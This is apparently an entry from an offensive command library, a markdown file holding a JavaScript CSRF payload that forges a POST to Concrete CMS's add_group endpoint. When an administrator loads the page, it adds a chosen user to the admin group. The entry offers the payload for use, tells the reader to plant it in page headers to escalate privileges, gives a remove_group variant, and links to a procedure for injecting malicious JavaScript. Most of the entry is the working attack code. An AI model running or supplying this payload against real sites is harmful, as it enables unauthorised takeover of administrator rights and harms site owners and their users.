---
id: cmd-uuid-001
data: >-
  var XHR = new XMLHttpRequest(); var urlEncodedData = ''; var
  urlEncodedDataPairs = []; var name; var data = {gID:'3', uID:'8'}; for(name in
  data) { urlEncodedDataPairs.push(encodeURIComponent(name) + '=' +
  encodeURIComponent(data[name])); } urlEncodedData =
  urlEncodedDataPairs.join('&').replace(/%20/g, '+');
  XHR.addEventListener('load', function(event){}); XHR.addEventListener('error',
  function(event){}); XHR.open('POST',
  'http://<<site>>/concrete5/index.php/ccm/system/user/add_group');
  XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  XHR.setRequestHeader('Content-Length', urlEncodedData.length);
  XHR.send(urlEncodedData);
tags:
  - csrf
  - javascript
  - post-request
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:03.302Z'
verified: false
validated: true
submitted: true
---
# xmlhttprequest-csrf-add-group

## Command

```javascript
var XHR = new XMLHttpRequest(); var urlEncodedData = ''; var urlEncodedDataPairs = []; var name; var data = {gID:'3', uID:'8'}; for(name in data) { urlEncodedDataPairs.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name])); } urlEncodedData = urlEncodedDataPairs.join('&').replace(/%20/g, '+'); XHR.addEventListener('load', function(event){}); XHR.addEventListener('error', function(event){}); XHR.open('POST', 'http://<<site>>/concrete5/index.php/ccm/system/user/add_group'); XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); XHR.setRequestHeader('Content-Length', urlEncodedData.length); XHR.send(urlEncodedData);
```

## Description

This JavaScript command creates an XMLHttpRequest to send a forged POST request to Concrete CMS's add_group endpoint, exploiting CSRF to add a user to a group. Use in page headers or scripts to elevate privileges when an admin visits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| gID | Group ID (e.g., '3' for admin) | Yes |
| uID | User ID to add (e.g., '8') | Yes |
| <<site>> | Target site URL | Yes |

## Examples

### Basic Usage

```javascript
// As above, with defaults for admin group
```

### Advanced Usage

```javascript
// For remove_group: Change open() to 'remove_group' and adjust data if needed
XHR.open('POST', 'http://<<site>>/concrete5/index.php/ccm/system/user/remove_group');
```

## Expected Output

Successful response (200 OK) with no body; user added to group on next login. Check CMS dashboard for confirmation.

## Related

- [[commands/xmlhttprequest-csrf-remove-group]]
- [[procedures/Inject-Malicious-JavaScript-into-Page-Header]]
